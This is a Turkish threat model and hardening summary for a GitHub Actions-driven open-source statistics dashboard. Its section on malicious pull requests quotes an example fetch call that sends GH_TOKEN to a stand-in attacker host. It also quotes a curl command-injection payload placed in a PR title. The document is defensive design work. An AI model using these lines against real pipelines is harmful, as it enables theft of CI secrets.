1. Yönetici özeti

Türkiye Açık Kaynak Radarı, GitHub API'den her gün veri çekip kendi zaman serisini biriktiren statik bir pano. Ürünün en kritik varlığı, veri çekmek için kullanılan token ve bu token'ı çalıştıran GitHub Actions hattı. Kartımdaki öncelikli tehdit, kötü niyetli bir pull request'in bu hatta kod çalıştırıp token'ı dışarı sızdırması.

Bu tehdide karşı hat beş katmanda sertleştirildi: en az yetkili workflow'lar, pull_request_target yasağı, commit SHA ile sabitlenmiş üçüncü taraf Actions, branch protection ile zorunlu inceleme ve harden-runner ile ağ çıkışının engellenmesi. Sertleştirmenin etkisi OpenSSF Scorecard ile önce ve sonra ölçüldü.

2. Mimari ve güven sınırları

Veri akışı: snapshot job salt okunur token'la API'den veri okur ve yalnız botun yazdığı data dalına yazar. Kod main dalından Cloudflare'e derlenir. Tarayıcı kodu Cloudflare'den, veriyi doğrudan data dalından okur. Hiçbir sır tarayıcıya veya derlemeye ulaşmaz. PR'lar yalnız sırsız CI'ı tetikler.

3.1 T1 ayrıntılı: kötü niyetli PR ile token hırsızlığı

Senaryo: Saldırgan depoyu fork'lar, veri betiğine fetch('https://saldirgan.example/?t=' + process.env.GH_TOKEN) ekleyip PR açar. Workflow PR kodunu sırlarla çalıştırırsa token sızar. İkinci varyant: PR başlığına "; curl … $GITHUB_TOKEN # yazıp workflow içindeki satır içi ${{ github.event.pull_request.title }} ifadesinden komut enjekte etmek.

6. İzleme ve olay müdahalesi

  • Log'lar: GitHub Actions çalıştırma log'ları (her snapshot), Cloudflare Workers istek ve hata gözlemleri, harden-runner ağ raporu.
  • Alarm 1, veri hattı: Snapshot başarısız olursa job kırmızıya döner ve GitHub depo sahibine e-posta gönderir. Veri dosyasına status: error yazılır, sitede uyarı bandı görünür.
  • Alarm 2, bayat veri: Veri 36 saatten eskiyse site kullanıcıya uyarı gösterir.
  • Runbook: "API anahtarım sızdı" senaryosu için tespit → iptal → yenileme → inceleme → bildirim adımları docs/RUNBOOK.md'de. Token salt okunur olduğu için en kötü etki, hız sınırının başkası tarafından tüketilmesi.
